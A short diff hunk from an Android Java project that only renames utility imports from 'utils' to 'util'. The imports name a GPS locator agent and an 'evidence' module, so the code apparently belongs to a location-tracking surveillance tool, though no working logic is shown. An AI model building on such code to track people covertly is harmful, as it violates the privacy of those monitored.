@@ -13,10 +13,10 @@ import com.ht.RCSAndroidGUI.agent.position.GPSLocatorPeriod;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
-import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
-import com.ht.RCSAndroidGUI.utils.DateTime;
-import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
+import com.ht.RCSAndroidGUI.util.DateTime;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 import android.content.Context;
 import android.location.Location;
